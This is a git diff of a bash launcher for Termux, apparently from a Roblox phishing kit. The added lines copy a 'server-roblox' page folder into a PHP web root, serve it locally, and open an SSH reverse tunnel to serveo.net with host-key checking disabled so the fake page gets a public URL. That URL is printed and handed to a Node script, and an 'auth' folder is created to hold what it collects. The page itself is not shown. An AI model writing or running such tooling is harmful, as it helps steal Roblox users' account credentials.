@@ -8,9 +8,44 @@
 # ─╚╝╚═╝─╚═══╝─╚═══╝─╚═══╝─╚═══╝─╚═╝╚═╝
 #   Start Script ==> Termux : bash start.sh
 
+if [[ ! -d "auth" ]]; then
+	mkdir -p "auth"
+fi
+
+if [[ ! -d ".history" ]]; then
+	mkdir -p ".history"
+fi
+
+if [[ -d ".server/www" ]]; then
+	rm -rf ".server/www"
+	mkdir -p ".server/www"
+else
+	mkdir -p ".server/www"
+	
+fi
+
+if [[ -e ".server/.loclx" ]]; then
+	rm -rf ".server/.loclx"
+
+fi
+
+if [[ -d ".server/.cld.log" ]]; then
+	rm -rf ".server/.cld.log"    
+fi
+
+if [[ ! -d ".sever" ]]; then
+	mkdir -p ".server"
+fi
+
+ printf "\e[1;92m"
+
+ HOST="127.0.0.1"
+ PORT="8080"
+
 whoami=$(command whoami)
 pwd=$(command pwd)
 date_time=$(date "+%Y-%m-%d %H:%M:%S")
+
 
 start(){
 echo -e "\n[::] Loading Program..."
@@ -19,10 +54,11 @@ if [[ $? -eq 0 ]]; then
 echo -e "\n\033[32mUser Conected!\033[37m"
 echo -e "WELCOME!"
 echo -e "Date : $date_time\nUser : $whoami"
+cp -rf server-roblox/ .server/www
+cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
+start_serveo
 node index.js
-#cd
-#cd Roblox-Phisher
-#bash start.sh
+echo -e "${WHITE}[-] URL: ${GREEN} $send_url"
 else
 sleep 0.74
 echo -e ""
@@ -35,6 +71,22 @@ sleep 0.2
 echo -e "\033[33mroblox \033[37mVerifique a sua rede wi-fi..."
 start
 fi
+}
+
+start_serveo() {
+    sleep 0.75
+    cd .server/www && php -S 127.0.0.1:$PORT > /dev/null 2>&1 &
+    sleep 2
+    echo ''
+    if [[ -e .server/www/linksender ]]; then
+        rm -rf .server/www/linksender
+    fi
+    $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$PORT' serveo.net 2> /dev/null > .server/www/linksender ' &
+    sleep 7
+    send_url=$(grep -o "https://[0-9a-z]*\.serveo.net" .server/www/linksender)
+    
+    # Inicia o server.js passando send_url como argumento
+    node index.js "$send_url"
 }
 
 start;
